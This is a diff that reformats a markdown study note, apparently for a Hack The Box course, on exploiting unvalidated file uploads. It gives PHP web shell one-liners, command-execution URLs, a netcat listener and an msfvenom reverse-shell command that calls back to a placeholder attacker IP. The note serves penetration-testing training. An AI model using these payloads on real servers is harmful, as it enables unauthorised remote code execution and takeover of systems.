@@ -1,18 +1,13 @@
-````markdown
 # File Upload Attacks - Basic Exploitation
 
 ## 🚨 Absent Validation
-
 This is the most critical and easiest file upload vulnerability to exploit.
-
-If there is no validation → any file can be uploaded → full server compromise
+If there is no validation → any file can be uploaded → full server compromise.
 
 ---
 
 ## 🔓 What Does It Mean?
-
 The application does not validate:
-
 - File extension  
 - File content  
 - MIME type  
@@ -25,215 +20,108 @@ The application does not validate:
 ## ⚙️ Attack Flow
 
 ### 1. Upload a Malicious File
-
 Example:
-
-```php
 <?php echo "Hello HTB"; ?>
-````
 
 Or a web shell:
-
-```php
 <?php system($_GET['cmd']); ?>
-```
-
----
 
 ### 2. File is Stored Without Restrictions
-
-Example path:
-
-/uploads/shell.php
-
----
+Example path: `/uploads/shell.php`
 
 ### 3. Access the File
-
-[http://SERVER/uploads/shell.php](http://SERVER/uploads/shell.php)
-
----
+URL: `http://SERVER/uploads/shell.php`
 
 ### 4. Code Execution
-
-If you see output:
-
-Hello HTB
-
-➡️ Code execution confirmed (RCE)
+If you see: "Hello HTB" ➡️ Code execution confirmed (RCE)
 
 ---
 
 ## 🧠 Identify Backend Technology
-
 Before uploading payloads, identify the backend language.
 
-### Methods:
-
-* Try extensions:
-
-  * /index.php
-  * /index.asp
-  * /index.aspx
-
-* Use tools like Wappalyzer
-
-* Analyze:
-
-  * HTTP headers
-  * Cookies
-  * URL structure
+Methods:
+- Try extensions: `/index.php`, `/index.asp`, `/index.aspx`
+- Use tools like Wappalyzer
+- Analyze: HTTP headers, Cookies, URL structure
 
 ---
 
 ## ⚠️ Indicators of Vulnerability
-
-* “All Files” allowed
-* .php upload works
-* No validation errors
-* File executes after upload
-
-➡️ Likely no validation at all
+- “All Files” allowed in the file picker.
+- .php (or other script) upload works without errors.
+- No validation errors or warnings.
+- File executes immediately after upload.
+➡️ Likely no validation at all.
 
 ---
 
 ## 💥 Impact
-
-* Remote command execution
-* Full system access
-* Data exfiltration
-* Lateral movement
-
----
-
-## 🧩 Key Idea
-
-If you can upload an executable file
-And you can access it
-
-➡️ You control the server
+- Remote command execution (RCE).
+- Full system access.
+- Data exfiltration.
+- Lateral movement within the network.
 
 ---
 
 ## 🚀 Upload Exploitation
-
 Once upload is possible, the goal is to gain control of the system.
 
----
-
-## 🐚 Web Shell
-
+### 🐚 Web Shell
 A web shell allows command execution via browser.
 
-### Simple Web Shell
-
-```php
+Simple Web Shell:
 <?php system($_REQUEST['cmd']); ?>
-```
 
-### Usage:
-
-[http://SERVER/uploads/shell.php?cmd=id](http://SERVER/uploads/shell.php?cmd=id)
+Usage:
+`http://SERVER/uploads/shell.php?cmd=id`
 
 Example output:
+`uid=33(www-data)`
 
-uid=33(www-data)
+Using Existing Shells:
+- phpbash
+- SecLists Web-Shells
 
----
-
-### Using Existing Shells
-
-* phpbash
-* SecLists Web-Shells
-
----
-
-## 🔄 Reverse Shell
-
+### 🔄 Reverse Shell
 More powerful than a web shell.
+✔ Interactive access  
+✔ Better for post-exploitation  
+✔ Enables pivoting  
 
-✔ Interactive access
-✔ Better for post-exploitation
-✔ Enables pivoting
+1. Prepare Payload: Set `$ip` to YOUR_IP and `$port` to YOUR_PORT.
+2. Start Listener: `nc -lvnp 4444`
+3. Execute Payload: Visit `http://SERVER/uploads/reverse.php`
+Result: `connect to YOUR_IP` ➡️ Shell access obtained.
 
----
-
-### Step 1: Prepare Payload
-
-```php
-$ip = 'YOUR_IP';
-$port = YOUR_PORT;
-```
-
----
-
-### Step 2: Start Listener
-
-```bash
-nc -lvnp 4444
-```
-
----
-
-### Step 3: Execute Payload
-
-[http://SERVER/uploads/reverse.php](http://SERVER/uploads/reverse.php)
-
----
-
-### Result
-
-connect to YOUR_IP
-uid=33(www-data)
-
-➡️ Shell access obtained
-
----
-
-## ⚙️ Generate Reverse Shell (msfvenom)
-
-```bash
+### ⚙️ Generate Reverse Shell (msfvenom)
 msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > reverse.php
-```
 
 ---
 
 ## 🧠 Web Shell vs Reverse Shell
-
-| Type          | Pros                  | Cons                  |
-| ------------- | --------------------- | --------------------- |
-| Web Shell     | Simple, reliable      | Limited functionality |
-| Reverse Shell | Interactive, powerful | May be blocked        |
+- Web Shell: Simple, reliable | Cons: Limited functionality.
+- Reverse Shell: Interactive, powerful | Cons: May be blocked by firewalls.
 
 ---
 
 ## ⚠️ Common Issues
-
-* system() disabled
-* Firewall blocking outbound traffic
-* WAF detection
-* Permission restrictions
-
-➡️ Alternatives:
-
-* LFI
-* Log poisoning
-* Different payloads
+- system() function disabled in php.ini.
+- Firewall blocking outbound traffic.
+- WAF (Web Application Firewall) detection.
+- Permission restrictions on the upload folder.
 
 ---
 
 ## 🔥 Summary
-
-Upload without validation → upload web shell → execute commands
-
-If possible → reverse shell → full system control
+1. Upload without validation.
+2. Upload web shell.
+3. Execute commands.
+4. If possible → Upgrade to reverse shell → Full system control.
 
 ---
 
 ## 🧠 Pentester Mindset
-
-1. Can I execute code?
-2. Can I get a shell?
-3. Can I escalate privileges?
-
-```
+- Can I execute code?
+- Can I get a shell?
+- Can I escalate privileges?
